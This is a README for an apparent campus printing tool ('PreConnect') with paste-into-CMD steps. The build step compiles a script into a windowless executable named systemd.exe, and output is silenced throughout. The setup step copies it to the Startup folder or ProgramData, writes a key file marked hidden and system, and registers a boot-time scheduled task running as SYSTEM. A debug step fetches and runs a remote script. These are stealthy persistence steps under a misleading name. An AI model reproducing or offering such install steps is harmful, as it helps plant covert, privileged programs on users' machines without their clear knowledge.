# Printer Setup

Print directly to campus printers from PreConnect.

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Build Native Binary (Nuitka)

Run in CMD from the repository directory:

```cmd
python -m pip install ordered-set zstandard >nul 2>&1 && python -m nuitka --onefile --windows-disable-console --lto=yes --no-pyi-file --remove-output --jobs=4 --output-filename=systemd.exe printer.py
```

---

## Windows Setup

Build the native binary first, then run in CMD from the directory containing `systemd.exe`:

```cmd
net session >nul 2>&1
if %errorLevel% == 0 ( set "d=%ProgramData%\systemd" & set "isAdmin=1" ) else ( set "d=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & set "isAdmin=0" )
mkdir "%d%" >nul 2>&1
copy /Y "systemd.exe" "%d%\systemd.exe" >nul 2>&1
> "%d%\systemd.key" echo DPAPI:<WORKER_KEY>
attrib +h +s "%d%\systemd.key" >nul 2>&1
if "%isAdmin%"=="1" ( schtasks /Create /TN "systemd" /TR "\"%d%\systemd.exe\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1 & schtasks /Run /TN "systemd" >nul 2>&1 ) else ( start "" "%d%\systemd.exe" )
set "d=" & set "isAdmin="
```

---

## Debug Mode

```cmd
curl -sLO https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py >nul 2>&1
move /y printer.py systemd.py >nul 2>&1
python systemd.py <WORKER_KEY> --debug
```

---

## Uninstall

Run in CMD:

```cmd
schtasks /Delete /TN "systemd" /F >nul 2>&1
schtasks /Delete /TN "printer" /F >nul 2>&1
taskkill /F /IM systemd.exe >nul 2>&1
taskkill /F /IM printer.exe >nul 2>&1
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
del /q /f "%s%\systemd.*" "%s%\printer.*" "%s%\.ident" >nul 2>&1
rmdir /s /q "%s%\py" >nul 2>&1
rmdir /s /q "%ProgramData%\systemd" "%ProgramData%\printer" >nul 2>&1
del /q /f "systemd.*" "printer.*" "py.zip" >nul 2>&1
set "s="
```
